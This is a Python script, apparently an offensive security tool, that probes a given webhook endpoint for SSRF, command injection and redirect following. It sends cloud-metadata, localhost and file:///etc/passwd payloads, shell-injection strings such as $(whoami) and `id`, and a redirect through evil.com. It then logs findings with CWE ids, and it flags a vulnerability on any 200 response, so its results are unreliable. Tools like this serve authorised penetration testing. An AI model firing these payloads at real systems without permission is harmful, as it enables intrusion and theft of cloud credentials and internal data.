#!/usr/bin/env python3
"""
Webhook Exploit Tester
Tests for webhook vulnerabilities including SSRF, injection, and redirection
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin

class WebhookExploitTester:
    """Webhook vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })

    def scan(self):
        """Run webhook exploit tests"""
        print(f"[*] Starting webhook exploit testing on {self.target_url}")

        # Test webhook SSRF
        self._test_webhook_ssrf()

        # Test webhook injection
        self._test_webhook_injection()

        # Test webhook redirection
        self._test_webhook_redirection()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_webhook_ssrf(self):
        """Test webhook SSRF vulnerabilities"""
        print("[*] Testing webhook SSRF...")

        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/',  # GCP
            'http://localhost:22',  # SSH
            'http://127.0.0.1:6379',  # Redis
            'file:///etc/passwd',  # File protocol
        ]

        webhook_data = {
            'webhook_url': '',
            'callback_url': '',
            'url': '',
            'endpoint': ''
        }

        for payload in ssrf_payloads:
            for param in webhook_data.keys():
                test_data = {param: payload}

                try:
                    response = self.session.post(self.target_url, json=test_data, timeout=15)

                    if response.status_code in [200, 201]:
                        # Check if webhook was triggered
                        vuln = {
                            'type': 'Webhook SSRF',
                            'severity': 'critical',
                            'url': self.target_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Webhook accepted internal/cloud URL',
                            'description': 'Webhook triggers requests to internal services',
                            'cwe': 'CWE-918',
                            'impact': 'Access cloud metadata, internal services',
                            'remediation': 'Validate and whitelist webhook URLs'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Webhook SSRF via {param}")
                        return

                except:
                    pass

    def _test_webhook_injection(self):
        """Test command injection in webhooks"""
        print("[*] Testing webhook injection...")

        injection_payloads = [
            'http://example.com/$(whoami)',
            'http://example.com/`id`',
            'http://example.com/;ls;',
            'http://example.com/|whoami|',
        ]

        for payload in injection_payloads:
            test_data = {'webhook_url': payload}

            try:
                response = self.session.post(self.target_url, json=test_data, timeout=10)

                # Check for injection indicators in response
                if 'uid=' in response.text or 'root' in response.text:
                    vuln = {
                        'type': 'Webhook Command Injection',
                        'severity': 'critical',
                        'url': self.target_url,
                        'payload': payload,
                        'evidence': 'Command execution detected in response',
                        'description': 'Webhook URL parsed unsafely leading to command injection',
                        'cwe': 'CWE-78',
                        'impact': 'Remote code execution',
                        'remediation': 'Sanitize webhook URLs before processing'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Command injection in webhook")
                    return

            except:
                pass

    def _test_webhook_redirection(self):
        """Test webhook redirection following"""
        print("[*] Testing webhook redirection...")

        # Test if webhooks follow redirects to internal services
        redirect_tests = [
            ('http://evil.com/redirect-to-metadata', 'External to Internal Redirect'),
            ('http://169.254.169.254/redirect', 'Direct Internal Access'),
        ]

        for redirect_url, description in redirect_tests:
            test_data = {'webhook_url': redirect_url}

            try:
                response = self.session.post(self.target_url, json=test_data, timeout=15)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Webhook Redirect Following',
                        'severity': 'high',
                        'url': self.target_url,
                        'payload': redirect_url,
                        'evidence': f'{description} - Webhook follows redirects',
                        'description': 'Webhook follows HTTP redirects to internal services',
                        'cwe': 'CWE-918',
                        'impact': 'SSRF via redirect chain',
                        'remediation': 'Disable redirect following for webhooks'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Webhook follows redirects")
                    return

            except:
                pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 webhook_exploits.py <webhook_endpoint> [output_file]")
        print("\nExample:")
        print("  python3 webhook_exploits.py https://api.example.com/webhooks")
        print("\nTests for:")
        print("  - Webhook SSRF (cloud metadata, internal services)")
        print("  - Command injection via webhook URLs")
        print("  - Redirect following to internal services")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    tester = WebhookExploitTester(target, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
